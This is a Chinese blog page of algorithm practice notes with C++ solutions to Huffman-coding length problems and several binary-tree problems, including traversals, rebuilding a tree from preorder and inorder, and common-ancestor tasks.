<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">	<span class="type">int</span> x;</span><br><span class="line">	<span class="comment">// 定义优先队列的比较关系，这里我们定义的是小根堆 </span></span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> node&amp; a) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x &gt; a.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n, x;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) != EOF) &#123;</span><br><span class="line">		priority_queue&lt;node&gt; q;</span><br><span class="line">		<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">			cin &gt;&gt; x;</span><br><span class="line">			q.<span class="built_in">push</span>(node&#123;x&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (q.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">			node num1 = q.<span class="built_in">top</span>();</span><br><span class="line">			q.<span class="built_in">pop</span>();</span><br><span class="line">			node num2 = q.<span class="built_in">top</span>();</span><br><span class="line">			q.<span class="built_in">pop</span>();</span><br><span class="line">			ans += num1.x + num2.x;</span><br><span class="line">			q.<span class="built_in">push</span>(node&#123;num1.x + num2.x&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="哈夫曼编码">哈夫曼编码</h3>
<h5 id="题目描述-13">题目描述</h5>
<p>熵编码器是一种数据编码方法，它通过对删除了“浪费”或“多余”信息的消息进行编码来实现无损数据压缩。换句话说，熵编码首先删除了对消息进行精确编码所不需要的信息。高度的熵意味着一条带有大量浪费信息的消息。以ASCII编码的英文文本是具有非常高的熵的消息类型的示例。已经压缩的消息（例如JPEG图形或ZIP归档文件）的熵很小，因此无法从进一步的熵编码尝试中受益。</p>
<p>用ASCII编码的英文文本具有很高的熵，因为所有字符都使用相同的位数（八位）进行编码。众所周知的事实是，与英语文本中大多数其他字母相比，字母E，L，N，R，S和T的出现频率要高得多。如果可以找到一种仅用4位对这些字母进行编码的方法，则新的编码将更小，包含所有原始信息并且熵更少。
ASCII会使用固定位数，这是有原因的：这很容易，因为一个人总是处理固定位数来表示每个可能的字形或字符。对于上述字母使用四位的编码方案如何区分四位代码和八位代码？使用所谓的“无前缀可变长度”编码可以解决这个看似困难的问题。</p>
<p>在这种编码中，可以使用任意数量的位来表示任何字形，并且消息中不存在的字形也不会被简单地编码。但是，为了能够恢复信息，不允许将编码字形的位模式作为任何其他编码位模式的前缀。这允许对编码的比特流进行逐位读取，并且只要遇到代表字形的一组位，就可以对该字形进行解码。如果没有实施无前缀约束，那么这样的解码将是不可能的。</p>
<p>考虑文字“
AAAAABCD”。使用ASCII，对此进行编码将需要64位。相反，如果我们用位模式“
00”编码“ A”，用“ 01”编码“ B”，用“ 10”编码“ C”，用“ 11”编码“
D”，那么我们只能用16位编码该文本。位;结果位模式将为“
0000000000011011”。但是，这仍然是固定长度的编码。每个字形使用的是两位，而不是八位。由于字形“
A”以更高的频率出现，我们可以通过用更少的比特对其进行编码来做得更好吗？实际上我们可以，但是为了保持无前缀编码，其他一些位模式将变得比两位长。最佳编码是用“
0”编码“ A”，用“ 10”编码“ B”，用“ 110”编码“ C”，用“ 111”编码“ D”。
（这显然不是唯一的最佳编码，因为很明显，对于B，C和D的编码可以在不增加最终编码消息大小的情况下自由地互换用于任何给定的编码。）使用这种编码，消息可以在“
0000010110111”只有13位，压缩比为4.9：1（也就是说，最终编码消息中的每个位代表的信息与原始编码中4.9位的信息一样多）。从左到右通读此位模式，您会发现，即使代码的位长不同，无前缀编码也可以很容易地将其解码为原始文本。</p>
<p>作为第二个示例，请考虑文字“帽子里的猫”。在本文中，字母“
T”和空格字符均以最高频率出现，因此在最佳编码中，它们显然具有最短的编码位模式。字母“
C”，“ I”和“ N”仅出现一次，因此它们的编码最长。</p>
<p>有许多可能的无前缀可变长度位模式集，它们可以产生最佳编码，也就是说，允许文本以最少的位数进行编码。一种这样的最佳编码是使用“
00”，“ A”和“ 100”，“ C”和“ 1110”，“ E”和“ 1111”，“ H”和“ 110”，“ I”和“
1010”，“ N”和“ 1011”以及“ T”和“
01”。因此，最佳编码仅需要51位，而使用144位消息以8位ASCII编码（压缩率为2.8到1）进行编码时则需要144位。</p>
<h5 id="输入输出格式-11">输入输出格式</h5>
<h6 id="输入描述-13">输入描述:</h6>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">输入文件将包含文本字符串列表，每行一个。 文本字符串将仅包含大写字母数字字符和下划线（用于代替空格）。 输入结束将通过仅包含单词“ <span class="keyword">END</span>”作为文本字符串的行来表示。 此行不应被处理。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-13">输出描述:</h6>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">对于输入中的每个文本字符串，输出<span class="number">8</span>位<span class="keyword">ASCII</span>编码的位长度，最佳无前缀可变长度编码的位长度以及精确到小数点后的压缩率。</span><br></pre></td></tr></table></figure>
<p>只求哈夫曼编码的长度可以规约到以字符的数量大小为叶节点的哈夫曼树上。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string s;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s == <span class="string">&quot;END&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">			<span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">				m[s[i]]++;</span><br><span class="line">			&#125;</span><br><span class="line">			map&lt;<span class="type">char</span>, <span class="type">int</span>&gt;::iterator iterm;</span><br><span class="line">			priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt; &gt; q;</span><br><span class="line">			<span class="keyword">for</span>(iterm = m.<span class="built_in">begin</span>(); iterm != m.<span class="built_in">end</span>(); iterm++)&#123;</span><br><span class="line">				q.<span class="built_in">push</span>(iterm-&gt;second);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span>(q.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">				ans = q.<span class="built_in">top</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(q.<span class="built_in">size</span>() &gt; <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="type">int</span> t1 = q.<span class="built_in">top</span>();</span><br><span class="line">				q.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="type">int</span> t2 = q.<span class="built_in">top</span>();</span><br><span class="line">				q.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="type">int</span> t3 = t1 + t2;</span><br><span class="line">				ans += t3;</span><br><span class="line">				q.<span class="built_in">push</span>(t3);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="type">int</span> l = len * <span class="number">8</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d %d %.1f\n&quot;</span>, l, ans, (<span class="type">double</span>)l / ans);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉树">二叉树</h2>
<p>一些概念：二叉树定义、特点、性质：</p>
<p><img src="/.io//算法刷题记录/1687596261551.png" alt="1687596261551"></p>
<p><img src="/.io//算法刷题记录/1687596272848.png" alt="1687596272848"></p>
<p><img src="/.io//算法刷题记录/1687596299111.png" alt="1687596299111"><img src="/.io//算法刷题记录/1687596289196.png" alt="1687596289196"></p>
<p>其他的概念比如满二叉树、完全二叉树，二叉树遍历（前中后序）</p>
<h3 id="二叉树的建立和遍历">二叉树的建立和遍历</h3>
<h5 id="题目描述-14">题目描述</h5>
<p>建立以二叉链作为存储结构的二叉树，实现 1）先序遍历； 2）中序遍历；
3）后序遍历； 4）层序遍历； 5）编程计算二叉树的叶子结点个数。</p>
<h5 id="输入输出格式-12">输入输出格式</h5>
<h6 id="输入描述-14">输入描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">按照先序遍历序列输入二叉树中数据元素的值，没有的输入0表示。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-14">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">第一行输出先序遍历序列 第二行输出中序遍历序列 第三行输出后序遍历序列 第四行输出叶子结点的个数。</span><br></pre></td></tr></table></figure>
<p>注意函数传参</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> max(a, b) a &gt; b ? a : b;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">char</span> c;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">createTree</span><span class="params">(Tree &amp;T)</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> c;</span><br><span class="line">	cin &gt;&gt; c;</span><br><span class="line">	<span class="keyword">if</span>(c == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">		T = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		T = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">		T-&gt;c = c;</span><br><span class="line">		<span class="built_in">createTree</span>(T-&gt;l);</span><br><span class="line">		<span class="built_in">createTree</span>(T-&gt;r); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		<span class="built_in">PreOrderTraverse</span>(T-&gt;l);</span><br><span class="line">		<span class="built_in">PreOrderTraverse</span>(T-&gt;r);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">InOrderTraverse</span>(T-&gt;l);</span><br><span class="line">		cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		<span class="built_in">InOrderTraverse</span>(T-&gt;r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">PostOrderTraverse</span>(T-&gt;l);</span><br><span class="line">		<span class="built_in">PostOrderTraverse</span>(T-&gt;r);</span><br><span class="line">		cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Leaf</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;l == <span class="literal">NULL</span> &amp;&amp; T-&gt;r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">Leaf</span>(T-&gt;l) + <span class="built_in">Leaf</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Depth</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> x = <span class="built_in">Depth</span>(T-&gt;l);</span><br><span class="line">	<span class="type">int</span> y = <span class="built_in">Depth</span>(T-&gt;r);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">max</span>(x, y) + <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Tree root;</span><br><span class="line">	<span class="built_in">createTree</span>(root);</span><br><span class="line">	<span class="built_in">PreOrderTraverse</span>(root);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">InOrderTraverse</span>(root);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">PostOrderTraverse</span>(root);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">Leaf</span>(root) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二叉树遍历">二叉树遍历</h3>
<h5 id="题目描述-15">题目描述</h5>
<p>编一个程序，读入用户输入的一串先序遍历字符串，根据此字符串建立一个二叉树（以指针方式存储）。
例如如下的先序遍历字符串： ABC##DE#G##F###
其中“#”表示的是空格，空格字符代表空树。建立起此二叉树以后，再对二叉树进行中序遍历，输出遍历结果</p>
<h5 id="输入输出格式-13">输入输出格式</h5>
<h6 id="输入描述-15">输入描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输入包括1行字符串，长度不超过100。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-15">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">可能有多组测试数据，对于每组数据，</span><br><span class="line">输出将输入字符串建立二叉树后中序遍历的序列，每个字符后面都有一个空格。</span><br><span class="line">每个输出结果占一行。</span><br></pre></td></tr></table></figure>
<p>注意create的时候，new出来的tree空间是在堆上，和栈一样要初始化（但我也不知道为什么上一题不用也可以），总之初始化一定不会有问题</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">char</span> c;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125; *Tree;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line">string s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">create</span><span class="params">(Tree &amp;T)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(idx &gt;= s.<span class="built_in">size</span>()) <span class="keyword">return</span>;</span><br><span class="line">	<span class="type">char</span> c = s[idx++];</span><br><span class="line">	<span class="keyword">if</span>(c == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">		T = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		T = <span class="keyword">new</span> node;</span><br><span class="line">		T-&gt;c = c;</span><br><span class="line">		T-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">		T-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">create</span>(T-&gt;l);</span><br><span class="line">		<span class="built_in">create</span>(T-&gt;r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">InOrderTraverse</span>(T-&gt;l);</span><br><span class="line">		cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		<span class="built_in">InOrderTraverse</span>(T-&gt;r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		Tree root;</span><br><span class="line">		<span class="built_in">create</span>(root);</span><br><span class="line">		<span class="built_in">InOrderTraverse</span>(root);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二叉树-1">二叉树</h3>
<h5 id="题目描述-16">题目描述</h5>
<pre><code>1
  /
2   3
/ \ /</code></pre>
<p>4 5 6 7 / / / / 如上图所示，由正整数 1, 2, 3,
...组成了一棵无限大的二叉树。从某一个结点到根结点（编号是1的结点）都有一条唯一的路径，比如从5到根结点的路径是（5,
2, 1），从4到根结点的路径是（4, 2,
1），从根结点1到根结点的路径上只包含一个结点1，因此路径就是（1）。对于两个结点x和y，假设他们到根结点的路径分别是（x1,
x2, ... ,1）和（y1, y2,...,1），那么必然存在两个正整数i和j，使得从xi
和yj 开始，有xi = yj，xi + 1 = yj + 1，xi + 2 = yj + 2，...
现在的问题就是，给定x和y，要求他们的公共父节点，即xi（也就是 yj）。</p>
<h5 id="输入输出格式-14">输入输出格式</h5>
<h6 id="输入描述-16">输入描述:</h6>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">输入包含多组数据，每组数据包含两个正整数<span class="keyword">x</span>和y（<span class="number">1</span>≤<span class="keyword">x</span><span class="punctuation">,</span> y≤<span class="number">2</span>^<span class="number">31</span><span class="number">-1</span>）。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-16">输出描述:</h6>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">对应每一组数据，输出一个正整数<span class="keyword">xi</span>，即它们的首个公共父节点。</span><br></pre></td></tr></table></figure>
<p>利用完全二叉树的特性，父节点 =子节点/2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> x, y;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line">		<span class="keyword">while</span>(x!=y)&#123;</span><br><span class="line">			<span class="keyword">if</span>(x &gt; y)&#123;</span><br><span class="line">				x /=<span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				y /= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二叉树2">二叉树2</h3>
<h5 id="题目描述-17">题目描述</h5>
<p><img src="https://noobdream.com/media/upload/2019/10/24/39_1429598902788_btree.jpg"></p>
<pre><code>如上所示，由正整数1，2，3……组成了一颗特殊二叉树。我们已知这个二叉树的最后一个结点是n。现在的问题是，结点m所在的子树中一共包括多少个结点。     比如，n = 12，m = 3那么上图中的结点13，14，15以及后面的结点都是不存在的，结点m所在子树中包括的结点有3，6，7，12，因此结点m的所在子树中共有4个结点。</code></pre>
<h5 id="输入输出格式-15">输入输出格式</h5>
<h6 id="输入描述-17">输入描述:</h6>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">输入数据包括多行，每行给出一组测试数据，包括两个整数m，n (<span class="number">1</span> &lt;<span class="operator">=</span> m &lt;<span class="operator">=</span> n &lt;<span class="operator">=</span> <span class="number">1000000000</span>)。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-17">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">对于每一组测试数据，输出一行，该行包含一个整数，给出结点m所在子树中包括的结点的数目。</span><br></pre></td></tr></table></figure>
<p>直接递归</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cal</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x &gt; y)&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		ans += <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">cal</span>(x*<span class="number">2</span>, y);</span><br><span class="line">		<span class="built_in">cal</span>(x*<span class="number">2</span>+<span class="number">1</span>, y);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> x, y;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line">		ans = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cal</span>(x, y);</span><br><span class="line">		cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二叉树遍历2">二叉树遍历2</h3>
<h5 id="题目描述-18">题目描述</h5>
<p>二叉树的前序、中序、后序遍历的定义：
前序遍历：对任一子树，先访问跟，然后遍历其左子树，最后遍历其右子树；
中序遍历：对任一子树，先遍历其左子树，然后访问根，最后遍历其右子树；
后序遍历：对任一子树，先遍历其左子树，然后遍历其右子树，最后访问根。
给定一棵二叉树的前序遍历和中序遍历，求其后序遍历（提示：给定前序遍历与中序遍历能够唯一确定后序遍历）。</p>
<h5 id="输入输出格式-16">输入输出格式</h5>
<h6 id="输入描述-18">输入描述:</h6>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">两个字符串，其长度n均小于等于<span class="number">26</span>。</span><br><span class="line">第一行为前序遍历，第二行为中序遍历。</span><br><span class="line">二叉树中的结点名称以大写字母表示：<span class="selector-tag">A</span>，<span class="selector-tag">B</span>，C....最多<span class="number">26</span>个结点。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-18">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输入样例可能有多组，对于每组测试样例，</span><br><span class="line">输出一行，为后序遍历的字符串。</span><br></pre></td></tr></table></figure>
<p>对前序来说，第一个永远是父节点；对中序来说，父节点将子节点分开。根据这个思路递归建树</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">char</span> c;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"></span><br><span class="line"><span class="function">Tree <span class="title">build</span><span class="params">(string pre, string mid, <span class="type">int</span> start, <span class="type">int</span> end)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(start &gt; end) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = start; i &lt;= end; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(pre[flag] == mid[i]) n = i;</span><br><span class="line">	&#125;</span><br><span class="line">	Tree t;</span><br><span class="line">	t = <span class="keyword">new</span> node;</span><br><span class="line">	t-&gt;c = pre[flag];</span><br><span class="line">	t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">	t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">	flag++;</span><br><span class="line">	t-&gt;l = <span class="built_in">build</span>(pre, mid, start, n<span class="number">-1</span>);</span><br><span class="line">	t-&gt;r = <span class="built_in">build</span>(pre, mid, n+<span class="number">1</span>, end);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrderTraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(t!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">PostOrderTraverse</span>(t-&gt;l);</span><br><span class="line">		<span class="built_in">PostOrderTraverse</span>(t-&gt;r);</span><br><span class="line">		cout &lt;&lt; t-&gt;c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string x, y;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line">		flag = <span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> len = y.<span class="built_in">size</span>();</span><br><span class="line">		Tree root;</span><br><span class="line">		root = <span class="built_in">build</span>(x, y, <span class="number">0</span>, len<span class="number">-1</span>);</span><br><span class="line">		<span class="built_in">PostOrderTraverse</span>(root);</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断二叉树是否对称">判断二叉树是否对称</h3>
<h5 id="题目描述-19">题目描述</h5>
<p>层次遍历的方式输入一个二叉树，判断这个二叉树的结构（即不用管结点的值）是否镜像对称。</p>
<h5 id="输入输出格式-17">输入输出格式</h5>
<h6 id="输入描述-19">输入描述:</h6>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">输入一行字母，其中<span class="meta">#表示空节点（字母长度小于1000）。</span></span><br></pre></td></tr></table></figure>
<h6 id="输出描述-19">输出描述:</h6>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">如果输入的二叉树对称，输出<span class="keyword">YES</span>，否则输出<span class="keyword">NO</span>。</span><br></pre></td></tr></table></figure>
<p>先层次读入二叉树，方法是用队列，先进的节点先读取；然后递归判断是否对称，即使用左右节点。</p>
